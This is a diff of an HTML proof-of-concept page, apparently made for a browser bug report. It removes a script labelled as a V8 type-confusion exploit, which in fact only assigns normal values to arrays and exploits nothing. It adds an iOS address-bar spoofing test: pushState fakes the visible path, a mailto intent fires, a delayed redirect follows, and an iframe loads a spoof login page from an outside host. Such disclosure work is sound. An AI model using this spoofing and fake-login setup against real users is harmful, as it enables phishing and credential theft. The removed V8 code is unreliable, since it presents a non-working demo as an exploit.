@@ -1,65 +1,49 @@
 <!doctype html>
-<meta charset="utf-8">
-<title>V8 Type Confusion PoC - Educational</title>
-<pre id="log"></pre>
+<html lang="en">
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>iOS External Intent Navigation State PoC</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+    }
+    iframe {
+      width: 100%;
+      height: 420px;
+      border: 1px solid #ccc;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<button id="test">Trigger mailto intent</button>
+
+<!-- iframe langsung ada -->
+<iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
 
 <script>
-const log = m => {
-    document.getElementById("log").textContent += m + "\n";
-    console.log(m);
+document.getElementById('test').onclick = () => {
+
+  // Step 1: change visible URL
+  history.pushState({}, '', '/expected-path');
+
+  // Step 2: trigger external intent
+  setTimeout(() => {
+    location.href = 'mailto:tap again to mozila';
+  }, 300);
+
+  // Step 3: delayed navigation after intent
+  setTimeout(() => {
+    location.href = 'https://www.mozilla.org:8080';
+  }, 1200);
 };
-
-// --- helper ---
-function hex(f) {
-    let buf = new ArrayBuffer(8);
-    new Float64Array(buf)[0] = f;
-    let u = new Uint32Array(buf);
-    return u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
-}
-
-// --- vulnerable function (educational) ---
-function vuln(arr, idx, val) {
-    // simulates type confusion: float array treated as object array
-    return arr[idx] = val;
-}
-
-// --- warmup JIT ---
-function warmup() {
-    let arr = Array.from({length:50}, (_,i)=>i+0.5);
-    for(let i=0;i<100000;i++) vuln(arr, i%50, i+0.5);
-    return arr;
-}
-
-// --- trigger type confusion ---
-function trigger(arr) {
-    // Force type change
-    arr[0] = {foo:1};
-    arr[1] = {bar:2};
-    arr.length = 2;
-    return arr;
-}
-
-// --- main ---
-function run() {
-    log("[*] warming up JIT");
-    let base = warmup();
-
-    log("[*] triggering type confusion...");
-    let arr = base.slice();
-    arr = trigger(arr);
-
-    // now arr is "type confused" (in old V8 style)
-    let float_arr = base; // float array still optimized
-    log("[*] overwriting float array via type-confused object array");
-
-    // simulate “memory corruption”
-    float_arr[10] = 1.1;  // normal
-    float_arr[11] = {evil:123}; // type confusion primitive
-
-    log(`[DEMO] arr[11] = ${JSON.stringify(float_arr[11])}`);
-    log(`[DEMO] arr[10] = ${float_arr[10]}`);
-    log(`[INFO] hex(arr[10]) = ${hex(float_arr[10])}`);
-}
-
-run();
 </script>
+
+<p>
+Observe whether the address bar always reflects the active document
+after returning from the mail app.
+</p>
+
+</body>
+</html>
